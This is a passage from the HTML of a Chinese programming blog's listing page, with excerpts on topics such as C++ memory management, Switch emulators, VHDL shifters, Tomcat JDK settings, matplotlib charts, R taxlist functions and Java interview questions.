	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0a5b6e778e66f520d73192ef866e19bb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/574b271d96175f45e234d68142e65bdf/" rel="bookmark">
			C&amp;C&#43;&#43;内存管理【非常详细，对新手友好】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、程序内存划分1.基础知识2. 堆栈的区别3. 题目练手 二、C语言中动态内存管理方式三、C++中动态内存管理方式1. new/delete操作内置类型2. new/delete操作自定义类型 四、operator new和operator delete函数1. 汇编查看编译器底层调用2. 透过源码分析两个全局函数 五、new和delete的底层实现1.内置类型2.自定义类型 六、定位new表达式1. 使用格式与使用场景 七、内存泄漏1. 什么是内存泄漏，内存泄漏的危害2. 内存泄漏分类（了解）3. 如何检测内存泄漏（了解）4. 如何避免内存泄漏 一、程序内存划分 1.基础知识 当我们运行一个程序时，这个程序所需要的数据及代码就会加载到内存中，不同的数据会放在内存的不同位置，内存不同位置的操作者也不同。
一般来说，一个程序所占用的内存主要分为以下几个部分：堆区、栈区、共享段库、静态区/数据段、代码段。
栈区：在执行函数时，函数内局部变量的存储单元都可以在栈上创建，函数执行结束时这些存储单元自动被释放。栈内存分配栈区运算内置于处理器的指令集中，效率很高，但是分配的内存容量有限。栈区主要存放运行函数而分配的局部变量、函数参数、返回数据、返回地址等。堆区：一般由程序员分配释放，若程序员不释放，程序结束时可能由OS回收。分配方式类似于链表。堆区主要进行动态内存分配，堆区的内存大小不固定，可以根据需要动态分配和释放。共享段库： （1）文件映射[通过使用函数如mmap0或CreateFileMapping0]（2）动态库[包含可以被程序在运行时动态加载的代码和数据]（3）匿名映射[将内存映射到进程地址空间的方式，而不是映射具体的文件] 静态区/数据段：存放全局变量、静态数据。程序结束后由系统释放。其在程序编译时就确定了变量的存储空间大小和内存地址，具有固定的大小和位置。代码段：存储**程序指令(代码)**的一块内存区域，也被称为文本段(TextSegment)，代码段通常是只读的，因为程序指令一般不应该被修改，代码段中存放函数体(类成员函数和全局函数)的二进制代码。
2. 堆栈的区别 堆（Heap）与栈（Stack）是开发人员必须面对的两个概念，在理解这两个概念时，需要放到具体的场景下，因为不同场景下，堆与栈代表不同的含义。一般情况下，有两层含义：
（1）程序内存布局场景下，堆与栈表示两种内存管理方式。
（2）数据结构场景下，堆与栈表示两种常用的数据结构。
我们这里讲的是程序内存布局的场景，不讲数据结构中的堆和栈。
栈简介
栈由操作系统自动分配释放 ，用于存放函数的参数值、局部变量等，其操作方式类似于数据结构中的栈。栈的内存地址生长方向与堆相反，由高到低，（栈是向低地址方向生长的）所以后定义的变量地址低于先定义的变量。栈中存储的数据的生命周期随着函数的执行完成而结束。
int a = 10; //栈 char str[] = "str"; //栈 char *p; //栈 堆简介
堆由开发人员分配和释放， 若开发人员不释放，程序结束时由 OS 回收，分配方式类似于链表。堆的内存地址生长方向与栈相反，由低到高。（堆是向高地址方向生长的）堆中存储的数据若未释放，则其生命周期等同于程序的生命周期。
int main() { // C 中用 malloc() 函数申请 char* p1 = (char *)malloc(10); // 用 free() 函数释放 free(p1); // C++ 中用 new 运算符申请 char* p2 = new char[10]; // 用 delete 运算符释放 delete[] p2; } 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/574b271d96175f45e234d68142e65bdf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b34c10c9b269d3e9a6ab0c2b0b0fcc8d/" rel="bookmark">
			【GitHub项目推荐--游戏模拟器（switch）】【转载】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		01 任天堂模拟器 yuzu 是 GitHub 上斩获 Star 最多的开源 Nintendo Switch 模拟器 ，使用 C++ 编写，考虑到了可移植性，该模拟器包括 Windows 和 Linux 端。
如果你的 PC 满足必要的硬件要求，该模拟器就能够运行大多数商业游戏，通过下方链接查看硬件要求和入门指南。
入门指南：https://yuzu-emu.org/help/quickstart
开源项目：https://github.com/yuzu-emu/yuzu
02 Nintendo 3DS 模拟器 Citra 是一个用 C++ 编写的实验性开源 Nintendo 3DS 模拟器/调试器，在编写时考虑到了可移植性，并有 Windows、Linux 和 macOS 三端使用。
开源地址：https://github.com/citra-emu/citra
03 Nintendo Switch 逆向工程 这个开源项目帮助你了解 Joycon 和 Nintendo Switch 的内部工作原理，其中 Joycon 是 Switch 的手柄。
开源地址：https://github.com/dekuNukem/Nintendo_Switch_Reverse_Engineering
04 逆向工程 Nintendo Switch 应用程序 REST API 用于 iOS 的 Nintendo Switch 应用程序中使用的逆向工程 REST API，包括有关 Splatoon 2 API 的文档。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b34c10c9b269d3e9a6ab0c2b0b0fcc8d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2cac60e938e4f74047bfa5583b5f4e04/" rel="bookmark">
			什么工具能将视频转成gif？分享一个在线制作gif网站
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Gif动图看起来效果非常的炫酷，也很复杂。这种gif动图制作起来是不是也很麻烦呢？其实制作gif动画的方法非常的简单，不用下载软件，小白也能操作。只需要使用在线制作gif（https://www.gif.cn/）工具-GIF中文网，上传MP4格式视频，支持原画质导出，一键就能制作1分钟或是600帧以内的gif动画。方法如下：
打开GIF中文网，点击“视频转gif”。
点击“开始取图-停止取图-取图完成”，设置生成gif的尺寸、速度等，点击开始生成。
完成后，点击下载图片。
视频转换成gif动图的操作就完成了，是不是很简单呢？如果生成的gif动画体积较大可使用gif压缩功能，一键就能快速压缩gif动画体积。欢迎大家前来操作体验！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dafd1a8f883610dcee61456646cb93a8/" rel="bookmark">
			ValueConverters.NET
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言 该工具包提供一些常用的值转换器，如布尔值、数值、字符串、空类型、可见性、枚举值、日期等相互转换，此外还提供了ValueConverterGroup，用以串联值转换器实现最终的转换目标。
xmlns:conv="clr-namespace:ValueConverters;assembly=ValueConverters" 简单使用 使用默认的True/Flase 转换值
&lt;conv:BoolToVisibilityConverter x:Key="AgreementToVisiblityConvert"/&gt; 或指定转换值：
&lt;conv:BoolToVisibilityConverter x:Key="AgreementToVisiblityConvert" FalseValue="Hidden" IsInverted="True" /&gt; 使用转换器组 实现string-&gt;可见性转换
&lt;conv:ValueConverterGroup x:Key="StringToVisibilityConverter"&gt; &lt;conv:StringIsNotNullOrEmptyConverter /&gt; &lt;conv:BoolInverter /&gt; &lt;conv:BoolToVisibilityConverter /&gt; &lt;/conv:ValueConverterGroup&gt; &lt;conv:ValueConverterGroup x:Key="StrNumInRangeToVisibilityConverter"&gt; &lt;conv:StringToDecimalConverter /&gt; &lt;conv:IsInRangeConverter MaxValue="19" MinValue="18" /&gt; &lt;conv:BoolInverter /&gt; &lt;conv:BoolToVisibilityConverter /&gt; &lt;/conv:ValueConverterGroup&gt; &lt;conv:ValueConverterGroup x:Key="StrLenInRangeToVisibilityConverter"&gt; &lt;conv:IsInRangeConverter MaxValue="15" MinValue="8" /&gt; &lt;conv:BoolInverter /&gt; &lt;conv:BoolToVisibilityConverter /&gt; &lt;/conv:ValueConverterGroup&gt; 调试时DebugConverter 可以打印前面的转换结果到控制台，方便查看中间的结果
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a21b726ab7e0fb7fefeea585e43b59bd/" rel="bookmark">
			基于QC-LDPC编码的循环移位网络的FPGA实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、桶式移位寄存器(barrel shifter) 八位桶式移位寄存器的VHDL实现如下，由于每一层结构相似，于是采用生成语句for_generate实现，使用该代码实现的RTL级分析和理论的结构一致，仿真结果也符合预期。 entity barrel_shift is GENERIC(DATA_WIDTH: INTEGER:=8; CTRL_WIDTH: INTEGER:=3); Port (DATA_IN: IN STD_LOGIC_VECTOR(DATA_WIDTH-1 DOWNTO 0); CTRL: IN STD_LOGIC_VECTOR(CTRL_WIDTH-1 DOWNTO 0); DATA_OUT: OUT STD_LOGIC_VECTOR(DATA_WIDTH-1 DOWNTO 0) ); end barrel_shift; architecture Behavioral of barrel_shift is SIGNAL LAYER_1_TEMP: STD_LOGIC_VECTOR(DATA_WIDTH-1 DOWNTO 0); SIGNAL LAYER_2_TEMP: STD_LOGIC_VECTOR(DATA_WIDTH-1 DOWNTO 0); SIGNAL LAYER_3_TEMP: STD_LOGIC_VECTOR(DATA_WIDTH-1 DOWNTO 0); begin LAYER_1:FOR I IN 0 TO 7 GENERATE G1:IF I&lt;=3 GENERATE LAYER_1_TEMP(I)&lt;=DATA_IN(I)WHEN CTRL(2)='0'ELSE DATA_IN(I+4); END GENERATE G1; G2:IF I&gt;3 GENERATE LAYER_1_TEMP(I)&lt;=DATA_IN(I)WHEN CTRL(2)='0'ELSE DATA_IN(I-4); END GENERATE G2; END GENERATE LAYER_1; LAYER_2:FOR I IN 0 TO 7 GENERATE G3:IF I&lt;=5 GENERATE LAYER_2_TEMP(I)&lt;=LAYER_1_TEMP(I)WHEN CTRL(1)='0'ELSE LAYER_1_TEMP(I+2); END GENERATE G3; G4:IF I&gt;5 GENERATE LAYER_2_TEMP(I)&lt;=LAYER_1_TEMP(I)WHEN CTRL(1)='0'ELSE LAYER_1_TEMP(I-6); END GENERATE G4; END GENERATE LAYER_2; LAYER_3:FOR I IN 0 TO 7 GENERATE G5:IF I&lt;=6 GENERATE LAYER_3_TEMP(I)&lt;=LAYER_2_TEMP(I)WHEN CTRL(0)='0'ELSE LAYER_2_TEMP(I+1); END GENERATE G5; G6:IF I&gt;6 GENERATE LAYER_3_TEMP(I)&lt;=LAYER_2_TEMP(I)WHEN CTRL(0)='0'ELSE LAYER_2_TEMP(I-7); END GENERATE G6; END GENERATE LAYER_3; DATA_OUT&lt;=LAYER_3_TEMP; end Behavioral; 二、QSN网络 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a21b726ab7e0fb7fefeea585e43b59bd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5771e81c7f066f86b5891007eba5e4ec/" rel="bookmark">
			Tomcat中如何指定Jdk版本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景：项目中有多个tomcat,不同tomcat要求的jdk版本不一样。
修改Tomcat/bin/下的配置文件，在catalina.sh文件和setclasspath.sh文件开头的空白处加上如下两句(指定JDK)：
export JAVA_HOME=/usr/local/java/jdk1.8.0_144
export JRE_HOME=/usr/local/java/jdk1.8.0_144/jre
如果只有jre
export JAVA_HOME=/data/jdk8u282-b08-jre
export JRE_HOME=/data/jdk8u282-b08-jre
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/254cd67f3bf90a8f781e5045922e9433/" rel="bookmark">
			数据可视化练习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 试题示例 试题示例 绘制下图所示的表格
根据下表的数据，将班级名称一列作为x轴的刻度标签，将男生和女生两列的数据作为刻度标签对应的数值，使用bar()函数绘制下图所示的柱形图。
方式一
import numpy as np import matplotlib.pyplot as plt plt.rcParams['font.sans-serif']="SimHei" plt.rcParams['axes.unicode_minus']=False x1=np.array(["高二1班","高二2班","高二3班","高二4班","高二5班","高二6班",]) ym=np.array([90.5,89.5,88.7,88.5,85.2,86.6]) yw=np.array([92.7,87.0,90.5,85.0,89.5,89.8]) x=np.arange(len(yw)) width=0.3 plt.bar(x,ym,width,label="男生平均分") plt.bar(x+width,yw,width,label="女生平均分") plt.ylim(0,ym.max()*1.35) plt.xticks(x,labels=x1) plt.ylabel("分数") plt.title("高二各班男生、女生英语平均成绩") avg=(np.average(ym)+np.average(yw))/2 plt.axhline(avg,ls="--",color='g',label="英语平均成绩") plt.legend() #print(avg) plt.show() 方式二
import numpy as np import matplotlib.pyplot as plt import pandas as pd y=pd.read_excel(r"d:/a.xlsx") plt.rcParams['font.sans-serif']="SimHei" plt.rcParams['axes.unicode_minus']=False x=np.arange(len(y["mavg"])) width=0.3 plt.bar(x,y["mavg"],width,label="男生平均分") plt.bar(x+width,y["wavg"],width,label="女生平均分") plt.ylim(0,120) plt.xticks(x,labels=y["bgmc"]) plt.ylabel("分数") plt.title("高二各班男生、女生英语平均成绩") avg=(np.mean(y["mavg"])+np.mean(y["wavg"]))/2 plt.axhline(avg,ls="--",color='g',label="英语平均成绩") plt.legend() plt.show() 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ede3c82b35d612db304e203bddc35ee/" rel="bookmark">
			【SLG副玩法融合之变：轻度化设计开启中小厂商新机遇】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		** SLG副玩法融合之变：轻度化设计开启中小厂商新机遇 **
在游戏这个百花齐放的行业里，SLG（Simulation Game，策略游戏）凭借其独特的策略体验和丰富的游戏内容，正在快速崛起，成为全球游戏市场中一个引人瞩目的新星。
SLG游戏最初起源于电脑端，主要特征是需要玩家进行资源管理、军事部署、战术规划等策略决策。经典的SLG游戏包括《文明》系列、《命令与征服》系列等。随着移动游戏的兴起与5G时代的到来，SLG类游戏正在快速向移动端转型，通过AI技术、AR增强现实等前沿科技手段，使得移动SLG游戏的体验更加丰富与沉浸。
01 SLG游戏全球市场概况 2023年，SLG移动游戏继续保持强劲增长态势，在海外市场表现突出，收入前100游戏中占比最大，达40.31%。近三年一直是海外营收主力，前三类别合计占比也在稳步提升。这显示出SLG游戏在全球移动游戏市场中的重要地位。
2023 年全球 SLG 手游下载量预计将突破 7 亿次，同比大幅增长 23.5%。该品类游戏的市场占有率与吸金能力有目共睹，吸引了越来越多发行商在近两年推陈出新。
2023 年SLG手游在策略游戏中下载量份额超过 52.1% 。手游用户在SLG游戏的支出为 81 亿美元，高于疫情前 2020 年 78 亿美元。2023 年策略游戏整体用户支出中，76.4% 来自SLG品类。
题材上，奇幻、历史等主题依旧热门，科幻、社会性动物题材快速崛起。地域偏好明显不同,展现多样性。欧美偏好中世纪和战争，中日韩偏好三国。
总体而言，SLG移动游戏全球市场增势强劲，新兴市场带动，题材丰富，地域特色鲜明。
02 SLG游戏的创新与变革 SLG游戏正在经历持续的技术进步和玩法创新，以适应用户需求和趣味的变化。具体来看，随着硬件和软件技术的大幅提升，SLG游戏在图像、引擎、AI等方面的表现更加出色，极大丰富了游戏体验的真实性和沉浸感。与此同时，游戏开发者也在不断探索新的战斗机制、资源管理策略等创新要素，以保持并激发玩家的长期兴趣。此外，SLG游戏开始与其他媒体和平台进行融合，增加了跨平台和文化融合的可能性。社交和网络元素的引入也使得SLG游戏中的玩家互动和社区体验得到加强。
在目前上线的SLG游戏中，这些创新点的体现尤为明显。例如，《率土之滨》和《三国志·战略版》通过其精彩的战争历程和深入的策略玩法吸引玩家，这些游戏的高质量图形和智能AI对手增加了游戏的吸引力和挑战性，从而提高了玩家的参与度和留存率。
同时，《明日方舟》成功地移植到移动平台，并通过结合SLG和塔防游戏玩法，展示了如何通过跨媒体和跨平台的融合以及玩法创新来扩大市场覆盖面。
此外，《无悔华夏》融合了策略和经营元素，鼓励玩家参与复杂的社交和策略决策，增强了玩家社区的互动性。《战争与文明》则通过其全面战争的主题和多样的文明元素，成功吸引了全球玩家，显示了文化多样性是如何帮助SLG游戏在国际市场上取得成功的。
这些游戏通过不断地更新和改进，保持了玩家的兴趣，并吸引了新玩家，展示了持续更新和改进的重要性。
03 SLG游戏的特点及吸引力 近年来，SLG游戏在核心玩法构建上经历了显著转变。传统的SLG游戏主要聚焦“4X”体验，即在广阔地图上进行探索、扩张、开发和征服。这类游戏机制复杂，需要大量研发和运营资源。近年，副游的出现开始改变这一格局。这些简化的小游戏提供与主游戏不同的体验。
这种转变有几个重要的好处：
🔸 丰富游戏内涵：引入副游可以为玩家提供更多样化的游戏体验。例如，在一款以战争和策略为主的SLG游戏中，可能会包含一些解谜或建设元素的副游，为玩家提供休息和不同类型的娱乐。
🔸 降低买量成本：副游通常更简单、更易于接触，可以吸引更广泛的玩家群体。这意味着游戏的推广和用户获取成本（即买量成本）可能会降低，因为这些游戏更容易吸引不同类型的玩家。
🔸 减轻对研发和运营资源的依赖：由于副游通常比主游戏的复杂性低，它们的开发和维护成本相对较低。这使得游戏开发商能够以较低的成本提供新内容，同时保持玩家的兴趣。
例如，一些SLG游戏通过包括城市建设或农场管理等副游，为玩家提供了与众不同的游戏体验。例如，在《部落冲突》中，除了主要的村庄建设和部落战斗外，还有一个名为“建造者基地”的副游，玩家在这里可以体验到不同的环境和战斗挑战。
同样，《帝国时代》除了主要的城市建设和战斗元素外，还包含了一系列的历史事件和文化节庆活动，这些活动充当了游戏的副游。
在《王国的崛起》中，除了城市建设和战略战斗，游戏还引入了“探索”功能，让玩家探索地图上的未知区域。
《文明6》则通过引入科技树、文化政策和宗教系统等副游元素，为玩家提供了不同于传统军事征服的路径。
在《模拟城市》中，玩家除了管理城市和建筑外，还可以参与解决城市问题和完成特定建设任务等副游活动。
这些副游中，玩家可能需要管理资源和规划建筑，这与主游戏的战略和战斗元素形成对比。这种多样性不仅增加了游戏的可玩性，还有助于吸引那些可能对传统SLG游戏不感兴趣的新玩家。通过这种方式，SLG游戏不仅能够保持传统玩家的兴趣，还能吸引更广泛的玩家群体。
04 挑战与机遇 SLG游戏市场迎来了新的机遇，长线运营成为了SLG游戏成功的重要因素。例如，那些在市场上表现最好的游戏往往是早期上线的产品，它们通过不断的内容更新和社群维护，能够在新机遇出现时迅速吸引和保持大量用户。这种长期致力于游戏内容和社区的策略为SLG游戏开发商提供了持续增长的机会。SLG游戏正逐渐从传统的4X体验向更加休闲和轻度化的玩法转变。这不仅降低了游戏的买量成本，使游戏更易于接触，而且为中小型开发商提供了市场机会。
此外，像BiliBili、Ncsoft、NEXON等此前未涉足SLG游戏的知名厂商的加入，展现了跨平台发展的巨大潜力和市场对新型SLG游戏的需求。
2023年全球SLG移动游戏的下载量实现了显著增长，说明市场对SLG游戏的兴趣持续增加，为提供创新玩法和优质用户体验的游戏开发商带来了新的市场机遇。
SLG游戏市场的繁荣发展，也预示着整个游戏行业蓬勃的增长活力。如果你也想抓住这一难得契机，分一杯羹，可以扫描下方二维码领取游戏开发专业课程，获取游戏Demo制作的个性化指导。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/daa56f36efcbe6afc42e0924d01fb089/" rel="bookmark">
			python毕设选题 - 机器学习股票大数据量化分析与预测系统 - python 毕业设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 0 前言1 课题背景2 实现效果UI界面设计web预测界面RSRS选股界面 3 软件架构4 工具介绍Flask框架MySQL数据库LSTM 5 最后 0 前言 🔥 这两年开始毕业设计和毕业答辩的要求和难度不断提升，传统的毕设题目缺少创新和亮点，往往达不到毕业答辩的要求，这两年不断有学弟学妹告诉学长自己做的项目系统达不到老师的要求。
为了大家能够顺利以及最少的精力通过毕设，学长分享优质毕业设计项目，今天要分享的是
🚩 机器学习股票大数据量化分析与预测系统
🥇学长这里给一个题目综合评分(每项满分5分)
难度系数：3分工作量：3分创新点：3分 1 课题背景 基于机器学习的股票大数据量化分析系统，具有以下功能：
采集保存数据；分析数据；可视化；深度学习股票预测 2 实现效果 UI界面设计 功能简述
日常数据获取更新
交易功能
web预测界面 LSTM长时间序列预测RNN预测机器学习预测股票指标分析 预测效果如下：
RSRS选股界面 3 软件架构 整体的软件功能结构如下图
4 工具介绍 Flask框架 简介
Flask是一个基于Werkzeug和Jinja2的轻量级Web应用程序框架。与其他同类型框架相比，Flask的灵活性、轻便性和安全性更高，而且容易上手，它可以与MVC模式很好地结合进行开发。Flask也有强大的定制性，开发者可以依据实际需要增加相应的功能，在实现丰富的功能和扩展的同时能够保证核心功能的简单。Flask丰富的插件库能够让用户实现网站定制的个性化，从而开发出功能强大的网站。
本项目在Flask开发后端时，前端请求会遇到跨域的问题，解决该问题有修改数据类型为jsonp，采用GET方法，或者在Flask端加上响应头等方式，在此使用安装Flask-CORS库的方式解决跨域问题。此外需要安装请求库axios。
Flask框架图
代码实例
from flask import Flask, render_template, jsonify import requests from bs4 import BeautifulSoup from snownlp import SnowNLP import jieba import numpy as np app = Flask(__name__) app.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/daa56f36efcbe6afc42e0924d01fb089/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8a4d6e8b602cba368452e0af2411530/" rel="bookmark">
			《微信小程序开发从入门到实战》学习九十五
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 7.1 视图容器组件 7.1.4 movable-viewe和movable-area组件 scale属性用于设置是否支持双指缩放。默认支持缩放手势的区域是movable-view范围内，在movable-area组件上可以设置一个boolean类型的scale-area属性值为true时，可将缩放手势生效区域扩大为整个movable-area组件内。
movable-view与movable-area组件都需要设置width和height属性，如果不设置默认为10px。
7.1.5 cover-view组件和cover-image组件 在小程序中，微信创建了一些原生组件，包括camera、canvas、input（仅在focus时表现为原生组件）、live-player、live-pusher、map、textarea和video组件。
原生组件与非原生组件是不同的渲染流程，在界面显示有一些差异。原生组件的层级高于非原生组件。页面中的非原生组件无论将z-index设置为多少。都无法覆盖在原生组件之上。
小程序提供了cover-view和cover-image组件解决了原生组件层级最高的限制。这两是原生组件，可以覆盖部分原生组件上，包括camera、canvas、live-player、live-pusher、map、video组件。
cover-view是可覆盖原生组件上的容器组件，它内部只能包含文本或者嵌套cover-view、cover-image和button，只能包含文本、图片或按钮。
cover-image不是容器组件，作用和image组件类似，可以显示一张图片。但cover-image显示的图片可以覆盖在原生组件上，image组件不可以。cover-image的src属性，用于指定图片的路径、即网络路径或临时路径，自基础库2.2.3版本起支持云文件ID。
微信开发工具上的原生组件是用web组件模拟的，可能不能很好地还原真机的表现，开发者在使用原生组件时应该尽量在真机上进行测试。
7.2 基础内容组件 在页面中如果需要展示一些内容时，往往需要使用一些基础内容组件。
7.2.1 text组件 text组件是最常见的组件，用于在页面显示一些文本内容。可阅读第2章的text组件介绍
7.2.2 icon组件 icon是十分常见的组件，用于在页面显示一些图标。可阅读第3章的icon组件介绍
7.2.3 image组件 image组件在页面显示图片。可阅读第3章的image组件介绍
7.2.4 progress组件 progress组件是一个进度条组件，在页面显示进度条数据。支持属性如下所示：
属性类型默认值说明最低版本precentnumber百分比1.0.0show-infobooleanfalse是否在进度条右侧显示百分比文字1.0.0border-radiusnumber/string0圆角大小2.3.1font-sizenumber/string16右侧百分比字体大小2.3.1stroke-widthnumber/string6进度条线的宽度1.0.0activeColorstring#09BB07已完成的进度条颜色1.0.0backgroundColorstring#EBEBEB进度条从左往右的颜色1.0.0activebooleanfalse进度条从左往右的动画1.0.0active-modestringbackwards backwards：动画从左往右播
forwards：动画从上次结束点接着播
1.7.0bindactiveendeventhandle绑定动画完成事件监听函数2.4.1 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6006c0e59f1d5b21f49e56cd085d1aad/" rel="bookmark">
			RTP工具改进(五)--使用qt
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前篇 第四篇
RTP工具改进(四) - rtmp协议推送
前面使用的工具一直为mfc，今天将使用qt 来做界面，使用qt 来进行程序和协议的编写，qt部分目前还不包括rtp ps流和rtmp，暂时只有rtp 直接传输，关于rtmp协议和ps流协议，先使用vs的mfc。增加和改变的模块为rtp，和 rtp_recv，如下图，以前的vs MFC版本都放到vs下面，有关于qt的 gb28181 的sip server 和 rtp 发送接收等都放到qt下面，所有可执行都放到外层的bin下面
代码地址
https://gitee.com/guanzhi0319/rtp
QT 加入 除了gb28181 的可视化界面，增加了两个程序，一个qt_rtp,一个qt_rtp_recv,打开后如下所示
2.1 发送端 目前制作还是比较简陋，先以能执行为主，使用qt 5.14，mingw，不依赖于vs，所以读者可以不安装vs就可以使用该代码,首先制作一个CameraVideoSurface类，用来读摄像头
#include "c_cameravideo.h" #include &lt;QDebug&gt; //c_cameravideo::c_cameravideo(QObject * parent) //{ //} CameraVideoSurface::CameraVideoSurface(QObject *parent) : QAbstractVideoSurface(parent) { //this-&gt;InitEncoder(); } CameraVideoSurface::~CameraVideoSurface() { // avformat_close_input(&amp;pOutputFormatCtx); // av_frame_free(&amp;yuvFrame); // av_packet_free(&amp;packet); // avcodec_close(pCodecCtx); } void CameraVideoSurface::setCameraResolution(const QSize &amp;size) { this-&gt;setNativeResolution(size); } QList&lt;QVideoFrame::PixelFormat&gt; CameraVideoSurface::supportedPixelFormats (QAbstractVideoBuffer::HandleType handleType) const { QList&lt;QVideoFrame::PixelFormat &gt; pixelFormats; pixelFormats.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6006c0e59f1d5b21f49e56cd085d1aad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fbee321322cc12065e1c1bec331b68cb/" rel="bookmark">
			R语言【taxlist】——match_names()：字符和 taxlist 对象之间的搜索匹配
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Package taxlist version 0.2.4
Description 字符向量中提供的名称将使用函数 stringsim（） 与存储在类 taxlist 对象中的插槽 taxonNames 中的名称进行比较。
Usage match_names(x, object, ...) ## S4 method for signature 'character,character' match_names( x, object, UsageID, best = 1, nomatch = TRUE, method = "lcs", cutlevel = NULL, ... ) ## S4 method for signature 'character,missing' match_names(x, best, cutlevel, nomatch = TRUE, ...) ## S4 method for signature 'character,taxlist' match_names( x, object, show_concepts = FALSE, accepted_only = FALSE, include_author = FALSE, .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fbee321322cc12065e1c1bec331b68cb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48c6d596309b9a1e4909f5ac956f0dee/" rel="bookmark">
			Java面试题及答案整理（ 2023年 6 月最新版，持续更新）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		发现网上很多Java面试题都没有答案，所以花了很长时间搜集整理出来了这套Java面试题大全~
这套互联网 Java 工程师面试题
一、Java 基础
1. JDK 和 JRE 有什么区别？
JDK：Java Development Kit 的简称，java 开发工具包，提供了 java 的开发环境和运行环境。JRE：Java Runtime Environment 的简称，java 运行环境，为 java 的运行提供了所需环境。 具体来说 JDK 其实包含了 JRE，同时还包含了编译 java 源码的编译器 javac，还包含了很多 java 程序调试和分析的工具。简单来说：如果你需要运行 java 程序，只需安装 JRE 就可以了，如果你需要编写 java 程序，需要安装 JDK。
篇幅限制下面就只能给大家展示小册部分内容了。包括了：Java面试、Spring、JVM、MyBatis、Redis、MySQL、并发编程、微服务、Linux、Springboot、SpringCloud、MQ、Kafka 面试专题
需要全套资料及答案的在【翻到文章底部，点击名片】即可免费获取 备注：“CSDN”
2. == 和 equals 的区别是什么？
== 对于基本类型来说是值比较，对于引用类型来说是比较的是引用；而 equals 默认情况下是引用比较，只是很多类重新了 equals 方法，比如 String、Integer 等把它变成了值比较，所以一般情况下 equals 比较的是值是否相等。
3. 两个对象的 hashCode()相同，则 equals()也一定为 true，对吗？
不对，两个对象的 hashCode()相同，equals()不一定 true。
代码解读：很显然“通话”和“重地”的 hashCode() 相同，然而 equals() 则为 false，因为在散列表中，hashCode()相等即两个键值对的哈希值相等，然而哈希值相等，并不一定能得出键值对相等。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/48c6d596309b9a1e4909f5ac956f0dee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f1f17ffe03d664541c884b40560eab7/" rel="bookmark">
			R语言【taxlist】——levels()：获取或设置分类等级列表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Package taxlist version 0.2.4
Description 分类层次结构可以设置为 taxlist 对象中的级别，按从低到高的顺序排列。
在 taxlist 对象中为特定分类概念添加分类级别。此外，概念限制的变化可能涉及其分类层次结构的变化。
Usage levels(x) ## S3 method for class 'taxlist' levels(x) levels(x) &lt;- value ## S3 replacement method for class 'taxlist' levels(x) &lt;- value Arguments 参数【x】：一个 taxlist 对象。
参数【value】：替换值的字符向量。
Details 分类级别将作为 taxlist 对象中的因子进行处理。这些级别对于创建相关组的子集很有用（例如，通过函数 get_children（） 或 get_parents（））。
与父子关系相结合的级别将进一步用于检查分类列表的一致性。
还实现了表单 levels（x） &lt;- value 的替换方法。
Value 具有添加或修改的分类级别的字符向量或 taxlist 对象。
Examples levels(Easplist) [1] "form" "variety" "subspecies" "species" "complex" [6] "genus" "family" levels(Easplist) &lt;- c("form", "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3f1f17ffe03d664541c884b40560eab7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b37406c9dd06e0c416b2ce148c624f84/" rel="bookmark">
